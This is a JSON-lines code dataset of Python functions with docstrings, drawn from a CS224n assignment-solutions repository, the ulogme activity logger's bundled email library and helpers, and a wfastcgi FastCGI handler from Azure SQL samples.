{"docstring": "\"\"\" Utilize `self.pretrained_embeddings` to map input `t` from input tokens (integers)\n    to embedding vectors.\n\n    PyTorch Notes:\n        - `self.pretrained_embeddings` is a torch.nn.Embedding object that we defined in __init__\n        - Here `t` is a tensor where each row represents a list of features. Each feature is represented by an integer (input token).\n        - In PyTorch the Embedding object, e.g. `self.pretrained_embeddings`, allows you to\n            go from an index to embedding. Please see the documentation (https://pytorch.org/docs/stable/nn.html#torch.nn.Embedding)\n            to learn how to use `self.pretrained_embeddings` to extract the embeddings for your tensor `t`.\n\n    @param t (Tensor): input tensor of tokens (batch_size, n_features)\n\n    @return x (Tensor): tensor of embeddings for words represented in t\n                        (batch_size, n_features * embed_size)\n\"\"\"\n### YOUR CODE HERE (~1-3 Lines)\n### TODO:\n###     1) Use `self.pretrained_embeddings` to lookup the embeddings for the input tokens in `t`.\n###     2) After you apply the embedding lookup, you will have a tensor shape (batch_size, n_features, embedding_size).\n###         Use the tensor `view` method to reshape the embeddings tensor to (batch_size, n_features * embedding_size)\n###\n### Note: In order to get batch_size, you may need use the tensor .size() function:\n###         https://pytorch.org/docs/stable/tensors.html#torch.Tensor.size\n###\n###  Please see the following docs for support:\n###     Embedding Layer: https://pytorch.org/docs/stable/nn.html#torch.nn.Embedding\n###     View: https://pytorch.org/docs/stable/tensors.html#torch.Tensor.view\n\n", "func_signal": "def embedding_lookup(self, t):\n", "code": "x = self.pretrained_embeddings(t)\nx = x.view(x.size()[0], -1)\n\n\n### END YOUR CODE\nreturn x", "path": "assignments\\a3\\parser_model.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Build Vocabulary.\n@param src_sents (list[str]): Source sentences provided by read_corpus() function\n@param tgt_sents (list[str]): Target sentences provided by read_corpus() function\n@param vocab_size (int): Size of vocabulary for both source and target languages\n@param freq_cutoff (int): if word occurs n < freq_cutoff times, drop the word.\n\"\"\"\n", "func_signal": "def build(src_sents, tgt_sents, vocab_size, freq_cutoff) -> 'Vocab':\n", "code": "assert len(src_sents) == len(tgt_sents)\n\nprint('initialize source vocabulary ..')\nsrc = VocabEntry.from_corpus(src_sents, vocab_size, freq_cutoff)\n\nprint('initialize target vocabulary ..')\ntgt = VocabEntry.from_corpus(tgt_sents, vocab_size, freq_cutoff)\n\nreturn Vocab(src, tgt)", "path": "assignments\\a4\\vocab.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Train the neural dependency parser for single epoch.\n\nNote: In PyTorch we can signify train versus test and automatically have\nthe Dropout Layer applied and removed, accordingly, by specifying\nwhether we are training, `model.train()`, or evaluating, `model.eval()`\n\n@param parser (Parser): Neural Dependency Parser\n@param train_data ():\n@param dev_data ():\n@param optimizer (nn.Optimizer): Adam Optimizer\n@param loss_func (nn.CrossEntropyLoss): Cross Entropy Loss Function\n@param batch_size (int): batch size\n@param lr (float): learning rate\n\n@return dev_UAS (float): Unlabeled Attachment Score (UAS) for dev data\n\"\"\"\n", "func_signal": "def train_for_epoch(parser, train_data, dev_data, optimizer, loss_func, batch_size):\n", "code": "parser.model.train() # Places model in \"train\" mode, i.e. apply dropout layer\nn_minibatches = math.ceil(len(train_data) / batch_size)\nloss_meter = AverageMeter()\n\nwith tqdm(total=(n_minibatches)) as prog:\n    for i, (train_x, train_y) in enumerate(minibatches(train_data, batch_size)):\n        optimizer.zero_grad()   # remove any baggage in the optimizer\n        loss = 0. # store loss for this batch here\n        train_x = torch.from_numpy(train_x).long()\n        train_y = torch.from_numpy(train_y.nonzero()[1]).long()\n\n        ### YOUR CODE HERE (~5-10 lines)\n        ### TODO:\n        ###      1) Run train_x forward through model to produce `logits`\n        ###      2) Use the `loss_func` parameter to apply the PyTorch CrossEntropyLoss function.\n        ###         This will take `logits` and `train_y` as inputs. It will output the CrossEntropyLoss\n        ###         between softmax(`logits`) and `train_y`. Remember that softmax(`logits`)\n        ###         are the predictions (y^ from the PDF).\n        ###      3) Backprop losses\n        ###      4) Take step with the optimizer\n        ### Please see the following docs for support:\n        ###     Optimizer Step: https://pytorch.org/docs/stable/optim.html#optimizer-step\n\n        logits = parser.model.forward(train_x)\n        loss = loss_func(logits, train_y)\n        loss.backward()\n        optimizer.step()\n        ### END YOUR CODE\n        prog.update(1)\n        loss_meter.update(loss.item())\n\nprint (\"Average Train Loss: {}\".format(loss_meter.avg))\n\nprint(\"Evaluating on dev set\",)\nparser.model.eval() # Places model in \"eval\" mode, i.e. don't apply dropout layer\ndev_UAS, _ = parser.parse(dev_data)\nprint(\"- dev UAS: {:.2f}\".format(dev_UAS * 100.0))\nreturn dev_UAS", "path": "assignments\\a3\\run.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Init VocabEntry Instance.\n@param word2id (dict): dictionary mapping words 2 indices\n\"\"\"\n", "func_signal": "def __init__(self, word2id=None):\n", "code": "if word2id:\n    self.word2id = word2id\nelse:\n    self.word2id = dict()\n    self.word2id['<pad>'] = 0   # Pad Token\n    self.word2id['<s>'] = 1 # Start Token\n    self.word2id['</s>'] = 2    # End Token\n    self.word2id['<unk>'] = 3   # Unknown Token\nself.unk_id = self.word2id['<unk>']\nself.id2word = {v: k for k, v in self.word2id.items()}", "path": "assignments\\a4\\vocab.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Given a corpus construct a Vocab Entry.\n@param corpus (list[str]): corpus of text produced by read_corpus function\n@param size (int): # of words in vocabulary\n@param freq_cutoff (int): if word occurs n < freq_cutoff times, drop the word\n@returns vocab_entry (VocabEntry): VocabEntry instance produced from provided corpus\n\"\"\"\n", "func_signal": "def from_corpus(corpus, size, freq_cutoff=2):\n", "code": "vocab_entry = VocabEntry()\nword_freq = Counter(chain(*corpus))\nvalid_words = [w for w, v in word_freq.items() if v >= freq_cutoff]\nprint('number of word types: {}, number of word types w/ frequency >= {}: {}'\n      .format(len(word_freq), freq_cutoff, len(valid_words)))\ntop_k_words = sorted(valid_words, key=lambda w: word_freq[w], reverse=True)[:size]\nfor word in top_k_words:\n    vocab_entry.add(word)\nreturn vocab_entry", "path": "assignments\\a4\\vocab.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Sanity check for CharDecoder.decode_greedy()\n    basic shape check\n\"\"\"\n", "func_signal": "def question_2d_sanity_check(decoder):\n", "code": "print(\"-\" * 80)\nprint(\"Running Sanity Check for Question 2d: CharDecoder.decode_greedy()\")\nprint(\"-\" * 80)\nsequence_length = 4\ninpt = torch.zeros(1, BATCH_SIZE, HIDDEN_SIZE, dtype=torch.float)\ninitialStates = (inpt, inpt)\ndevice = decoder.char_output_projection.weight.device\ndecodedWords = decoder.decode_greedy(initialStates, device)\nassert (len(decodedWords) == BATCH_SIZE\n        ), \"Length of decodedWords should be {} but is: {}\".format(\n            BATCH_SIZE, len(decodedWords))\nprint(\"Sanity Check Passed for Question 2d: CharDecoder.decode_greedy()!\")\nprint(\"-\" * 80)", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "# Make sure we pick up the audiotest.au that lives in email/test/data.\n# In Python, there's an audiotest.au living in Lib/test but that isn't\n# included in some binary distros that don't include the test\n# package.  The trailing empty string on the .join() is significant\n# since findfile() will do a dirname().\n", "func_signal": "def setUp(self):\n", "code": "datadir = os.path.join(os.path.dirname(landmark), 'data', '')\nfp = open(findfile('audiotest.au', datadir), 'rb')\ntry:\n    self._audiodata = fp.read()\nfinally:\n    fp.close()\nself._au = MIMEAudio(self._audiodata)", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\test\\test_email_renamed.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"This constructor adds a Content-Type: and a MIME-Version: header.\n\nThe Content-Type: header is taken from the _maintype and _subtype\narguments.  Additional parameters for this header are taken from the\nkeyword arguments.\n\"\"\"\n", "func_signal": "def __init__(self, _maintype, _subtype, **_params):\n", "code": "message.Message.__init__(self)\nctype = '%s/%s' % (_maintype, _subtype)\nself.add_header('Content-Type', ctype, **_params)\nself['MIME-Version'] = '1.0'", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\mime\\base.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Return the length of str when it is encoded with header quopri.\"\"\"\n", "func_signal": "def header_quopri_len(s):\n", "code": "count = 0\nfor c in s:\n    if hqre.match(c):\n        count += 3\n    else:\n        count += 1\nreturn count", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\quoprimime.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Encode a string with base64.\n\nEach line will be wrapped at, at most, maxlinelen characters (defaults to\n76 characters).\n\nIf binary is False, end-of-line characters will be converted to the\ncanonical email end-of-line sequence \\\\r\\\\n.  Otherwise they will be left\nverbatim (this is the default).\n\nEach line of encoded text will end with eol, which defaults to \"\\\\n\".  Set\nthis to \"\\\\r\\\\n\" if you will be using the result of this function directly\nin an email.\n\"\"\"\n", "func_signal": "def encode(s, binary=True, maxlinelen=76, eol=NL):\n", "code": "if not s:\n    return s\n\nif not binary:\n    s = fix_eols(s)\n\nencvec = []\nmax_unencoded = maxlinelen * 3 // 4\nfor i in range(0, len(s), max_unencoded):\n    # BAW: should encode() inherit b2a_base64()'s dubious behavior in\n    # adding a newline to the encoded string?\n    enc = b2a_base64(s[i:i + max_unencoded])\n    if enc.endswith(NL) and eol != NL:\n        enc = enc[:-1] + eol\n    encvec.append(enc)\nreturn EMPTYSTRING.join(encvec)", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\base64mime.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Turn a match in the form =AB to the ASCII character with value 0xab\"\"\"\n", "func_signal": "def _unquote_match(match):\n", "code": "s = match.group(0)\nreturn unquote(s)", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\quoprimime.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Decode a raw base64 string.\n\nIf convert_eols is set to a string value, all canonical email linefeeds,\ne.g. \"\\\\r\\\\n\", in the decoded text will be converted to the value of\nconvert_eols.  os.linesep is a good choice for convert_eols if you are\ndecoding a text attachment.\n\nThis function does not parse a full MIME header value encoded with\nbase64 (like =?iso-8895-1?b?bmloISBuaWgh?=) -- please use the high\nlevel email.header class for that functionality.\n\"\"\"\n", "func_signal": "def decode(s, convert_eols=None):\n", "code": "if not s:\n    return s\n\ndec = a2b_base64(s)\nif convert_eols:\n    return dec.replace(CRLF, convert_eols)\nreturn dec", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\base64mime.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"\nreturn time file was last modified, or 0 if it doesnt exist\n\"\"\"\n", "func_signal": "def mtime(f):\n", "code": "if os.path.isfile(f):\n  return int(os.path.getmtime(f))\nelse:\n  return 0", "path": "export_events.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "# The FWS after the comma is optional\n", "func_signal": "def test_parsedate_compact(self):\n", "code": "self.assertEqual(utils.parsedate('Wed,3 Apr 2002 14:58:26 +0800'),\n                 utils.parsedate('Wed, 3 Apr 2002 14:58:26 +0800'))", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\test\\test_email_renamed.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Test proper handling of a nested comment\"\"\"\n", "func_signal": "def test_getaddresses_embedded_comment(self):\n", "code": "eq = self.assertEqual\naddrs = utils.getaddresses(['User ((nested comment)) <foo@bar.com>'])\neq(addrs[0][1], 'foo@bar.com')", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\test\\test_email_renamed.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"\nDirty hack to replace non-ASCII characters in a string with spaces\n\"\"\"\n", "func_signal": "def remove_non_ascii(s):\n", "code": "if s is None:\n  return None\nreturn ''.join(c if ord(c) < 128 else ' ' for c in s)", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\ulogme_osx.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "# Issue 16564: This does not produce an RFC valid message, since to be\n# valid it should have a CTE of binary.  But the below works, and is\n# documented as working this way.\n", "func_signal": "def test_binary_body_with_encode_noop(self):\n", "code": "bytesdata = b'\\xfa\\xfb\\xfc\\xfd\\xfe\\xff'\nmsg = MIMEApplication(bytesdata, _encoder=encoders.encode_noop)\nself.assertEqual(msg.get_payload(), bytesdata)\nself.assertEqual(msg.get_payload(decode=True), bytesdata)\ns = StringIO()\ng = Generator(s)\ng.flatten(msg)\nwireform = s.getvalue()\nmsg2 = email.message_from_string(wireform)\nself.assertEqual(msg.get_payload(), bytesdata)\nself.assertEqual(msg2.get_payload(decode=True), bytesdata)", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\test\\test_email_renamed.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Return the length of str when it is encoded with body quopri.\"\"\"\n", "func_signal": "def body_quopri_len(str):\n", "code": "count = 0\nfor c in str:\n    if bqre.match(c):\n        count += 3\n    else:\n        count += 1\nreturn count", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\quoprimime.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Decode a quoted-printable string.\n\nLines are separated with eol, which defaults to \\\\n.\n\"\"\"\n", "func_signal": "def decode(encoded, eol=NL):\n", "code": "if not encoded:\n    return encoded\n# BAW: see comment in encode() above.  Again, we're building up the\n# decoded string with string concatenation, which could be done much more\n# efficiently.\ndecoded = ''\n\nfor line in encoded.splitlines():\n    line = line.rstrip()\n    if not line:\n        decoded += eol\n        continue\n\n    i = 0\n    n = len(line)\n    while i < n:\n        c = line[i]\n        if c != '=':\n            decoded += c\n            i += 1\n        # Otherwise, c == \"=\".  Are we at the end of the line?  If so, add\n        # a soft line break.\n        elif i+1 == n:\n            i += 1\n            continue\n        # Decode if in form =AB\n        elif i+2 < n and line[i+1] in hexdigits and line[i+2] in hexdigits:\n            decoded += unquote(line[i:i+3])\n            i += 3\n        # Otherwise, not in form =AB, pass literally\n        else:\n            decoded += c\n            i += 1\n\n        if i == n:\n            decoded += eol\n# Special case if original string did not end with eol\nif not encoded.endswith(eol) and decoded.endswith(eol):\n    decoded = decoded[:-1]\nreturn decoded", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\quoprimime.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "# Clear generic sys.path[0]\n", "func_signal": "def _reset_sys_path():\n", "code": "import sys, os\nresources = os.environ['RESOURCEPATH']\nwhile sys.path[0] == resources:\n    del sys.path[0]", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\__boot__.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"\nExecute the cached NSAppleScript to get the URL of active tab in Chrome.\nIf Chrome is running but has no open tabs then None will be returned.\nOddly enough if Chrome is not running then it will be started, and the\ntab name returned will be the default new tab URL.\n\nIt's probably best to only call this if we know that Chrome is running.\n\"\"\"\n", "func_signal": "def get_current_chrome_tab(self):\n", "code": "res = self.chrome_tab_script.executeAndReturnError_(None)\nif res[0] is None:\n  return None\nreturn str(res[0].stringValue())", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\ulogme_osx.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "# Issue 17171.\n", "func_signal": "def test_binary_body_with_encode_7or8bit(self):\n", "code": "bytesdata = b'\\xfa\\xfb\\xfc\\xfd\\xfe\\xff'\nmsg = MIMEApplication(bytesdata, _encoder=encoders.encode_7or8bit)\n# Treated as a string, this will be invalid code points.\nself.assertEqual(msg.get_payload(), bytesdata)\nself.assertEqual(msg.get_payload(decode=True), bytesdata)\nself.assertEqual(msg['Content-Transfer-Encoding'], '8bit')\ns = StringIO()\ng = Generator(s)\ng.flatten(msg)\nwireform = s.getvalue()\nmsg2 = email.message_from_string(wireform)\nself.assertEqual(msg.get_payload(), bytesdata)\nself.assertEqual(msg2.get_payload(decode=True), bytesdata)\nself.assertEqual(msg2['Content-Transfer-Encoding'], '8bit')", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\test\\test_email_renamed.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Decode a string encoded with RFC 2045 MIME header `Q' encoding.\n\nThis function does not parse a full MIME header value encoded with\nquoted-printable (like =?iso-8895-1?q?Hello_World?=) -- please use\nthe high level email.header class for that functionality.\n\"\"\"\n", "func_signal": "def header_decode(s):\n", "code": "s = s.replace('_', ' ')\nreturn re.sub(r'=[a-fA-F0-9]{2}', _unquote_match, s)", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\quoprimime.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "# msg_37.txt is a multipart that contains two dash-boundary's in a\n# row.  Our interpretation of RFC 2046 calls for ignoring the second\n# and subsequent boundaries.\n", "func_signal": "def test_double_boundary(self):\n", "code": "msg = self._msgobj('msg_37.txt')\nself.assertEqual(len(msg.get_payload()), 3)", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\test\\test_email_renamed.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "# A bug report by Andrew McNamara\n", "func_signal": "def test_three_lines(self):\n", "code": "lines = ['From: Andrew Person <aperson@dom.ain',\n         'Subject: Test',\n         'Date: Tue, 20 Aug 2002 16:43:45 +1000']\nmsg = email.message_from_string(NL.join(lines))\nself.assertEqual(msg['date'], 'Tue, 20 Aug 2002 16:43:45 +1000')", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\test\\test_email_renamed.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Encode with quoted-printable, wrapping at maxlinelen characters.\n\nIf binary is False (the default), end-of-line characters will be converted\nto the canonical email end-of-line sequence \\\\r\\\\n.  Otherwise they will\nbe left verbatim.\n\nEach line of encoded text will end with eol, which defaults to \"\\\\n\".  Set\nthis to \"\\\\r\\\\n\" if you will be using the result of this function directly\nin an email.\n\nEach line will be wrapped at, at most, maxlinelen characters (defaults to\n76 characters).  Long lines will have the `soft linefeed' quoted-printable\ncharacter \"=\" appended to them, so the decoded text will be identical to\nthe original text.\n\"\"\"\n", "func_signal": "def encode(body, binary=False, maxlinelen=76, eol=NL):\n", "code": "if not body:\n    return body\n\nif not binary:\n    body = fix_eols(body)\n\n# BAW: We're accumulating the body text by string concatenation.  That\n# can't be very efficient, but I don't have time now to rewrite it.  It\n# just feels like this algorithm could be more efficient.\nencoded_body = ''\nlineno = -1\n# Preserve line endings here so we can check later to see an eol needs to\n# be added to the output later.\nlines = body.splitlines(1)\nfor line in lines:\n    # But strip off line-endings for processing this line.\n    if line.endswith(CRLF):\n        line = line[:-2]\n    elif line[-1] in CRLF:\n        line = line[:-1]\n\n    lineno += 1\n    encoded_line = ''\n    prev = None\n    linelen = len(line)\n    # Now we need to examine every character to see if it needs to be\n    # quopri encoded.  BAW: again, string concatenation is inefficient.\n    for j in range(linelen):\n        c = line[j]\n        prev = c\n        if bqre.match(c):\n            c = quote(c)\n        elif j+1 == linelen:\n            # Check for whitespace at end of line; special case\n            if c not in ' \\t':\n                encoded_line += c\n            prev = c\n            continue\n        # Check to see to see if the line has reached its maximum length\n        if len(encoded_line) + len(c) >= maxlinelen:\n            encoded_body += encoded_line + '=' + eol\n            encoded_line = ''\n        encoded_line += c\n    # Now at end of line..\n    if prev and prev in ' \\t':\n        # Special case for whitespace at end of file\n        if lineno + 1 == len(lines):\n            prev = quote(prev)\n            if len(encoded_line) + len(prev) > maxlinelen:\n                encoded_body += encoded_line + '=' + eol + prev\n            else:\n                encoded_body += encoded_line + prev\n        # Just normal whitespace at end of line\n        else:\n            encoded_body += encoded_line + prev + '=' + eol\n        encoded_line = ''\n    # Now look at the line we just finished and it has a line ending, we\n    # need to add eol to the end of the line.\n    if lines[lineno].endswith(CRLF) or lines[lineno][-1] in CRLF:\n        encoded_body += encoded_line + eol\n    else:\n        encoded_body += encoded_line\n    encoded_line = ''\nreturn encoded_body", "path": "osx\\dist\\ulogme_osx.app\\Contents\\Resources\\lib\\python2.7\\email\\quoprimime.py", "repo_name": "karpathy/ulogme", "stars": 927, "license": "None", "language": "python", "size": 11763}
{"docstring": "\"\"\"Returns a generator that blocks until a change occurs, then yields\nthe filename of the changed file.\n\nYields an empty string and stops if the buffer overruns, indicating that\ntoo many files were changed.\"\"\"\n\n", "func_signal": "def enum_changes(path):\n", "code": "buffer = ctypes.create_string_buffer(32 * 1024)\nbytes_ret = ctypes.c_uint32()\n\ntry:\n    the_dir = CreateFile(\n        path, \n        FILE_LIST_DIRECTORY, \n        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,\n        0,\n        OPEN_EXISTING,\n        FILE_FLAG_BACKUP_SEMANTICS,\n        0,\n    )\nexcept OSError:\n    maybe_log(\"Unable to create watcher\")\n    return\n\nif not the_dir or the_dir == INVALID_HANDLE_VALUE:\n    maybe_log(\"Unable to create watcher\")\n    return\n\nwhile True:\n    ret_code = ReadDirectoryChangesW(\n        the_dir, \n        buffer, \n        ctypes.sizeof(buffer), \n        True, \n        FILE_NOTIFY_CHANGE_LAST_WRITE,\n        ctypes.byref(bytes_ret),\n        None,\n        None,\n    )\n\n    if ret_code:\n        cur_pointer = ctypes.addressof(buffer)\n        while True:\n            fni = ctypes.cast(cur_pointer, ctypes.POINTER(FILE_NOTIFY_INFORMATION))\n            # FileName is not null-terminated, so specifying length is mandatory.\n            filename = ctypes.wstring_at(cur_pointer + 12, fni.contents.FileNameLength // 2)\n            yield filename\n            if fni.contents.NextEntryOffset == 0:\n                break\n            cur_pointer = cur_pointer + fni.contents.NextEntryOffset\n    elif GetLastError() == ERROR_NOTIFY_ENUM_DIR:\n        CloseHandle(the_dir)\n        yield ''\n        return\n    else:\n        CloseHandle(the_dir)\n        return", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Writes the length of a single name for a key or value in a key/value\nstream\"\"\"\n", "func_signal": "def get_encoded_int(i):\n", "code": "if i <= 0x7f:\n    return struct.pack('>B', i)\nelif i < 0x80000000:\n    return struct.pack('>I', i | 0x80000000)\nelse:\n    raise ValueError('cannot encode value %s (%x) because it is too large' % (i, i))", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "'''Sends part of the response.'''\n", "func_signal": "def send(self, resp_type, content, streaming=True):\n", "code": "if not self.sent_headers:\n    if not self.header_bytes:\n        raise Exception(\"start_response has not yet been called\")\n\n    self.sent_headers = True\n    send_response(self.stream, self.record.req_id, FCGI_STDOUT, self.header_bytes)\n    self.header_bytes = None\n\nreturn send_response(self.stream, self.record.req_id, resp_type, content, streaming)", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Creates a FastCGI key/value stream and returns it as a byte string\"\"\"\n", "func_signal": "def write_fastcgi_keyvalue_pairs(pairs):\n", "code": "parts = []\nfor raw_key, raw_value in pairs.items():\n    key = wsgi_encode(raw_key)\n    value = wsgi_encode(raw_value)\n    \n    parts.append(get_encoded_int(len(key)))\n    parts.append(get_encoded_int(len(value)))\n    parts.append(key)\n    parts.append(value)\n\nreturn bytes().join(parts)", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "'''Sends part of the response.'''\n", "func_signal": "def send(self, resp_type, content, streaming=True):\n", "code": "if not self.sent_headers:\n    if not self.header_bytes:\n        raise Exception(\"start_response has not yet been called\")\n\n    self.sent_headers = True\n    send_response(self.stream, self.record.req_id, FCGI_STDOUT, self.header_bytes)\n    self.header_bytes = None\n\nreturn send_response(self.stream, self.record.req_id, resp_type, content, streaming)", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"reads FastCGI data stream and publishes it as wsgi.data\"\"\"\n", "func_signal": "def read_fastcgi_data(stream, req_id, content):\n", "code": "res = _REQUESTS[req_id].params\nif 'wsgi.data' not in res:\n    res['wsgi.data'] = content\nelse:\n    res['wsgi.data'] += content", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Reads a FastCGI key/value pair stream\"\"\"\n\n", "func_signal": "def read_fastcgi_keyvalue_pairs(content, offset):\n", "code": "offset, name_len = read_encoded_int(content, offset)\noffset, value_len = read_encoded_int(content, offset)\n\nname = content[offset:(offset + name_len)]\noffset += name_len\n\nvalue = content[offset:(offset + value_len)]\noffset += value_len\n\nreturn offset, name, value", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Logs messages to a log file if WSGI_LOG env var is defined.\"\"\"\n", "func_signal": "def log(txt):\n", "code": "log_file = os.environ.get('WSGI_LOG')\nif log_file:\n    with open(log_file, 'a+', encoding='utf-8') as f:\n        txt = txt.replace('\\r\\n', '\\n')\n        f.write('%s: %s%s' % (datetime.datetime.now(), txt, '' if txt.endswith('\\n') else '\\n'))", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Logs messages to a log file if WSGI_LOG env var is defined.\"\"\"\n", "func_signal": "def log(txt):\n", "code": "log_file = os.environ.get('WSGI_LOG')\nif log_file:\n    with open(log_file, 'a+', encoding='utf-8') as f:\n        txt = txt.replace('\\r\\n', '\\n')\n        f.write('%s: %s%s' % (datetime.datetime.now(), txt, '' if txt.endswith('\\n') else '\\n'))", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Starts sending the response. The response is ended when the context\nmanager exits.\"\"\"\n", "func_signal": "def start(self, status, headers, exc_info=None):\n", "code": "if exc_info:\n    try:\n        if self.sent_headers:\n            # We have to re-raise if we've already started sending data.\n            raise exception_with_traceback(exc_info[1], exc_info[2])\n    finally:\n        exc_info = None\nelif self.header_bytes:\n    raise Exception('start_response has already been called')\n\nif not isinstance(status, str):\n    status = wsgi_decode(status)\nheader_text = 'Status: %s\\r\\n' % status\nif headers:\n    header_text += ''.join('%s: %s\\r\\n' % handle_response._decode_header(*i) for i in headers)\nself.header_bytes = wsgi_encode(header_text + '\\r\\n')\n\nreturn lambda content: self.send(FCGI_STDOUT, content)", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Logs messages to a log file if WSGI_LOG env var is defined, and does not\nraise exceptions if logging fails.\"\"\"\n", "func_signal": "def maybe_log(txt):\n", "code": "try:\n    log(txt)\nexcept:\n    pass", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
